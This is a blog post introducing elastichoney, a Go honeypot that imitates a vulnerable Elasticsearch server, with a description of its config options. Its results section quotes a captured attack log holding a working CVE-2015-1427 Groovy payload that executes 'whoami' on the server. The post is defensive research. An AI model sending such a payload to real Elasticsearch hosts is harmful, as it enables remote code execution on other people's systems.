---
layout: post
title: "Introducing elastichoney - an Elasticsearch Honeypot"
date: 2015-03-23 6:30
comments: true
published: true
categories:
- go
- elasticsearch
- honeypot
---
<img src="{{root_url}}/images/headers/elastichoney.png"/>

### Introduction
I recently [wrote](/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/) about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to [elastichoney](http://github.com/jordan-wright/elastichoney)!
<!--more-->
### How it Works
This honeypot is pretty simple. It takes requests on the ```/```, ```/_search```, and ```/_nodes``` endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical - I took the responses straight from one of my hosts that got 0wned).

Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to ```stdout```, as well as to a file called ```elastichoney.log```.

It's important to note that this is by no means foolproof. Clever people can take a look at [the code](http://github.com/jordan-wright/elastichoney) and quickly find ways to detect the honeypot. It's not perfect, but it works. Let's take a look at some results.

### Results
Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I've seen approx. 2000 attacks from over 60 unique IP's over the course of a few days, all without advertising my elastichoney instance anywhere.

Here's an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:

``` json
{
    "source": "[redacted]",
    "@timestamp": "2015-03-23T13:34:22.519890008-05:00",
    "url": "[redacted]:9200/_search?pretty",
    "method": "POST",
    "form": "pretty=&{\"script_fields\":+{\"iswin\":+{\"lang\":+\"groovy\",+\"script\":+\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"whoami\\\").\\tgetInputStream())).readLines()\"}},+\"size\":+1}=",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36",
        "host": "[redacted]:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "[redacted]"
}
```
Now, I'm sure you're interested in some samples. [Here's](https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log) a bit of what I have so far. There's some nifty ```wget``` calls in there if you grab them fast enough.

Enjoy!

### Want to Run This Yourself?
*Awesome.* Let's take a look at what it takes to get elastichoney up and running. Installation should take about... 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you're interested in running elastichoney yourself, just download [the right binary](http://github.com/jordan-wright/elastichoney/releases) for your system, edit the config to your liking, and start it up!

Let's talk about some of the config options. The first option to note is ```use_remote```. I mentioned that elastichoney will log to ```stdout``` and a file by default. You can set this option to also have the honeypot send an HTTP ```POST``` containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.<sup>1</sup>

The second config option that you may want to play with is the ```spoofed_version``` option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the <=v1.2 RCE vuln vs the most recent RCE vuln).

Finally, the last option you might set is the ```anonymous``` option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it'll just use ```1.1.1.1```<sup>2</sup>. This is helpful if you want to create an anonymous cluster of honeypots.

As always, let me know if you have any questions or comments below.

-Jordan ([@jw_sec](https://twitter.com/jw_sec))

[1] Irony.<br/>
[2] Big shout-out to the person actually on ```1.1.1.1```.
